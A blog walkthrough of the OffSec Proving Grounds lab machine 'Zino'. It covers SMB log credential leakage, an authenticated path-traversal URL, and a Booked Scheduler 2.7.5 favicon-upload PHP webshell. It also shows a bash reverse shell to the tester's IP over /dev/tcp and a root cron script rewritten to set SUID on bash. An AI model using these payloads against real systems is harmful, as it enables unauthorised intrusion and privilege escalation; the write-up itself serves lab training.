---
title: "PG: Zino"
date: 2023-03-07
draft: false
os: "Linux"
difficulty: "Medium"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/zino/"]
tags:
  - offsec
  - proving-grounds
  - medium
  - linux
  - booked-scheduler
  - rce
  - file-upload
  - cron
  - python
categories:
  - walkthrough
---

{{< box-info name="Zino" os="Linux" difficulty="Medium" ip="192.168.206.64" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql   MariaDB (host not allowed)
8003/tcp open  http    Apache httpd 2.4.38
```
{{< /collapse >}}

A Debian box with a broad surface. FTP has no anonymous login, MySQL rejects remote connections (localhost-only MariaDB), and SSH is a dead end without creds. That leaves the web app on `8003` and the open SMB shares.

### Port 445 - SMB

The `zino` share is readable over a null session. Spidering it with CrackMapExec pulls down a folder of application logs (`access.log`, `auth.log`, `misc.log`) alongside `local.txt` — the user flag, handed over from the share before we even have a shell. `misc.log` is the prize — it records the Booked application being provisioned, leaking the admin credentials in cleartext:

![CrackMapExec spidering the zino share and misc.log leaking admin:adminadmin](/images/zino/smb-enum.png)

```
Set application username "admin"
Set application password "adminadmin"
```

`auth.log` also mentions an active user `peter`, but the password there was later rotated, so it's noise.

### Port 8003 - Booked Scheduler

The web root hosts **Booked Scheduler 2.7.5** under `/booked/Web/`. Directory fuzzing exposes the usual layout (`admin/`, `install/`, `Services/`, `uploads/`…). `searchsploit booked 2.7.5` returns two hits: an authenticated LFI and an authenticated RCE — and we already hold `admin:adminadmin` from SMB.

---

## Foothold

### The LFI rabbit hole

Booked's `manage_email_templates.php` is vulnerable to authenticated path traversal:

```
http://192.168.206.64:8003/booked/Web/admin/manage_email_templates.php?dr=template&lang=en_us&tn=../../../../../../../../etc/passwd&_=1588451710324
```

It happily reads arbitrary files, but there's no log-poisoning or RFI angle to turn it into code execution here. It's a dead end — worth confirming, then moving on.

### Booked Scheduler 2.7.5 RCE (manual)

The public [exploit](https://www.exploit-db.com/exploits/50594) for the theme-upload RCE doesn't fire clean, so drive it by hand ([reference PoC](https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF)). Logged in as `admin`, the theme manager lets you upload a custom favicon with no type checking:

```
http://192.168.206.64:8003/booked/Web/admin/manage_theme.php?action=
```

Upload a `custom-favicon.php` containing a one-line webshell:

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

The file lands in the web root and executes as PHP:

```
http://192.168.206.64:8003/booked/Web/custom-favicon.php?cmd=whoami
```

Command execution confirmed. Trade it for a reverse shell:

```
http://192.168.206.64:8003/booked/Web/custom-favicon.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.206/3306+0>%261'
```

Shell as `www-data`.

---

## Privilege Escalation

### Post-foothold recon

Booked's `config.php` leaks the database credentials, but MariaDB is localhost-only and those creds don't help — another rabbit hole:

![Booked config.php exposing the MySQL credentials](/images/zino/db-creds.png)

The real path is in `/etc/crontab`, where root runs a Python cleanup script every three minutes:

```
*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
```

And the script is world-writable:

```bash
$ ls -lha /var/www/html/booked/cleanup.py
-rwxrwxrwx 1 www-data www-data 160 Jan  9 14:30 /var/www/html/booked/cleanup.py
```

### Writable root cron script → SUID bash

Rewrite `cleanup.py` so the next root run copies the SUID bit onto a bash binary we control. First stage a copy of `/bin/bash` at `/var/www/html/booked/Web/bash`, then overwrite the script:

```python
#!/usr/bin/python3
import os
import sys
os.system("chown -R root:root /var/www/html/booked/Web/bash")
os.system("chmod u+s /var/www/html/booked/Web/bash")
```

Wait for the cron to fire (≤3 min), confirm the SUID bit landed, and drop into a root shell:

```bash
./bash -p
```

Root.

---

## Proof

The same `local.txt` we pulled from the SMB share earlier, now confirmed on-box at `/home/peter/local.txt`:

![User flag — cat /home/peter/local.txt](/images/zino/user-flag.png)

Root flag from `/root/proof.txt`, `whoami` returning root on `zino`:

![Root proof — whoami root, cat /root/proof.txt, hostname zino](/images/zino/root-flag.png)

---

## Key Takeaways

{{< callout type="note" >}}
- Always mine readable SMB shares for logs — Zino's provisioning logs handed over the Booked admin password in cleartext (`misc.log`).
- OffSec's public PoCs frequently fail to run as-is. Read the exploit, understand the upload-and-execute primitive, and reproduce it manually — here, an unchecked favicon upload gave a clean webshell.
- Not every credential is a path forward: the LFI and the localhost-only MySQL creds were both dead ends. Confirm and move on.
- A world-writable script executed by a root cron job is game over. Overwriting it to `chmod u+s` a bash copy is a clean, reliable route to root.
{{< /callout >}}
